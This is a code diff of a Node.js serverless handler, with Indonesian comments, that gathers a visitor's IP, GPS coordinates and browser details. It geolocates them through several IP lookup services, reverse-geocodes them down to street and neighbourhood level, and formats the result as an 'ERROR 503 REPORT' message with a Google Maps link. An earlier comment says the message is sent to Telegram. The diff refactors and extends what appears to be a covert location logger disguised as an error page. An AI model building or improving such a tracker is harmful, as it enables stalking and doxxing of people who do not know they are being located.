@@ -2,7 +2,8 @@ export const config = {
   runtime: "nodejs"
 };
 
-/* ===== ESTIMASI RT/RW ===== */
+/* ================= UTIL ================= */
+
 function estimateRTRW(lat, lon) {
   if (!lat || !lon) return "-";
   const lt = Math.abs(parseFloat(lat));
@@ -12,7 +13,6 @@ function estimateRTRW(lat, lon) {
   return `RT~${rt} / RW~${rw} (estimasi area)`;
 }
 
-/* ===== KUALITAS LOKASI ===== */
 function getLocationQuality(acc) {
   const a = parseFloat(acc);
   if (isNaN(a)) return "Low ❌";
@@ -21,29 +21,82 @@ function getLocationQuality(acc) {
   return "Low ❌";
 }
 
-/* ===== AMBIL IP PUBLIK ===== */
+/* ================= IP ================= */
+
 function getPublicIP(req) {
-  const raw =
+  let ip =
+    req.headers["x-forwarded-for"]?.split(",")[0] ||
+    req.headers["x-real-ip"] ||
     req.headers["cf-connecting-ip"] ||
-    req.headers["x-forwarded-for"] ||
-    req.socket.remoteAddress ||
+    req.socket?.remoteAddress ||
     "";
 
-  const list = raw.split(",").map(ip => ip.trim());
+  ip = ip.replace("::ffff:", "");
 
-  for (let ip of list.reverse()) {
-    if (
-      !ip.startsWith("10.") &&
-      !ip.startsWith("192.168.") &&
-      !ip.startsWith("172.") &&
-      ip !== "::1" &&
-      !ip.startsWith("127.")
-    ) {
-      return ip.replace("::ffff:", "");
-    }
+  if (
+    !ip ||
+    ip.startsWith("10.") ||
+    ip.startsWith("192.168.") ||
+    ip.startsWith("172.") ||
+    ip === "127.0.0.1" ||
+    ip === "::1"
+  ) {
+    return "Unknown";
   }
-  return "Unknown";
+  return ip;
 }
+
+/* ================= IP INFO (MULTI FALLBACK) ================= */
+
+async function getIPInfo(ip) {
+  const apis = [
+    async () => {
+      const r = await fetch(`https://ipapi.co/${ip}/json/`);
+      const j = await r.json();
+      if (!j || j.error) throw 0;
+      return {
+        country: j.country_name,
+        region: j.region,
+        city: j.city,
+        isp: j.org,
+        postal: j.postal
+      };
+    },
+    async () => {
+      const r = await fetch(`https://ipwho.is/${ip}`);
+      const j = await r.json();
+      if (!j || j.success === false) throw 0;
+      return {
+        country: j.country,
+        region: j.region,
+        city: j.city,
+        isp: j.isp,
+        postal: j.postal
+      };
+    },
+    async () => {
+      const r = await fetch(`https://ipinfo.io/${ip}/json`);
+      const j = await r.json();
+      if (!j || j.error) throw 0;
+      return {
+        country: j.country,
+        region: j.region,
+        city: j.city,
+        isp: j.org,
+        postal: j.postal
+      };
+    }
+  ];
+
+  for (const api of apis) {
+    try {
+      return await api();
+    } catch {}
+  }
+  return {};
+}
+
+/* ================= HANDLER ================= */
 
 export default async function handler(req, res) {
   if (req.method !== "POST") {
@@ -61,15 +114,9 @@ export default async function handler(req, res) {
   const time = new Date().toISOString().replace("T", " ").split(".")[0];
 
   /* ===== IP INFO ===== */
-  let ipinfo = {};
-  if (ip !== "Unknown") {
-    try {
-      const r = await fetch(`https://ipapi.co/${ip}/json/`);
-      ipinfo = await r.json();
-    } catch {}
-  }
+  const ipinfo = ip !== "Unknown" ? await getIPInfo(ip) : {};
 
-  /* ===== REVERSE GEOCODE ===== */
+  /* ===== ADDRESS ===== */
   let address = {};
   let locationSource = "GPS";
 
@@ -77,7 +124,7 @@ export default async function handler(req, res) {
     try {
       const geoRes = await fetch(
         `https://nominatim.openstreetmap.org/reverse?format=json&lat=${input.latitude}&lon=${input.longitude}&zoom=18&addressdetails=1`,
-        { headers: { "User-Agent": "VercelLocationBot/1.0" } }
+        { headers: { "User-Agent": "LocationBot/1.0" } }
       );
       const geo = await geoRes.json();
       address = geo.address || {};
@@ -85,20 +132,23 @@ export default async function handler(req, res) {
   } else {
     locationSource = "IP (Approximate)";
     address = {
+      road: "-",
+      village: "-",
+      suburb: "-",
       city: ipinfo.city,
       state: ipinfo.region,
-      country: ipinfo.country_name,
-      postcode: ipinfo.postal
+      postcode: ipinfo.postal,
+      country: ipinfo.country
     };
   }
 
-  const locationQuality = getLocationQuality(input.accuracy);
-  const rtRwEstimate =
+  const mapsLink =
     input.latitude && input.latitude !== "Not Allowed"
-      ? estimateRTRW(input.latitude, input.longitude)
+      ? `https://www.google.com/maps?q=${input.latitude},${input.longitude}`
       : "-";
 
-  /* ===== PESAN TELEGRAM ===== */
+  /* ================= MESSAGE ================= */
+
   const message = `🚨 *ERROR 503 REPORT*
 
 ━━━━━━━━━━━━━━━━━━━━
@@ -120,37 +170,33 @@ ${input.browser || "-"}
 ━━━━━━━━━━━━━━━━━━━━
 🌎 *IP INFORMATION*
 ━━━━━━━━━━━━━━━━━━━━
-🇮🇩 Country     : ${ipinfo.country_name || "-"}
-📍 Region       : ${ipinfo.region || "-"}
-🏙 City         : ${ipinfo.city || "-"}
-🏢 ISP / Org    : ${ipinfo.org || "-"}
-
-━━━━━━━━━━━━━━━━━━━━
-📡 *LOCATION INFORMATION*
-━━━━━━━━━━━━━━━━━━━━
-📐 Latitude     : ${input.latitude || "-"}
-📏 Longitude    : ${input.longitude || "-"}
+🌍 Country     : ${ipinfo.country || "-"}
+📍 Region      : ${ipinfo.region || "-"}
+🏙 City        : ${ipinfo.city || "-"}
+🏢 ISP / Org   : ${ipinfo.isp || "-"}
 
 ━━━━━━━━━━━━━━━━━━━━
 🏠 *ADDRESS INFORMATION*
 ━━━━━━━━━━━━━━━━━━━━
-📍 Street       : ${address.road || "-"}
-🏘 Village      : ${address.village || address.suburb || "-"}
-🏙 District     : ${address.city_district || address.county || "-"}
-🏛 City         : ${address.city || address.town || "-"}
-🌆 Province     : ${address.state || "-"}
+🛣 Street      : ${address.road || "-"}
+🏘 Village     : ${address.village || address.suburb || "-"}
+🏙 District    : ${address.city_district || address.county || "-"}
+🏛 City        : ${address.city || address.town || "-"}
+🌆 Province    : ${address.state || "-"}
 📮 Postal Code : ${address.postcode || "-"}
-🌍 Country      : ${address.country || "-"}
+🌍 Country     : ${address.country || "-"}
 
 ━━━━━━━━━━━━━━━━━━━━
 📐 *LOCATION QUALITY*
 ━━━━━━━━━━━━━━━━━━━━
-🎯 Quality      : ${locationQuality}
-🧭 Area Estimate: ${rtRwEstimate}
-📡 Source       : ${locationSource}
+🎯 Quality     : ${getLocationQuality(input.accuracy)}
+🧭 Area Est.   : ${
+    input.latitude ? estimateRTRW(input.latitude, input.longitude) : "-"
+  }
+📡 Source      : ${locationSource}
 
 🗺 Google Maps:
-https://www.google.com/maps?q=${input.latitude},${input.longitude}
+${mapsLink}
 
 ⏰ Time : ${time}`;
 
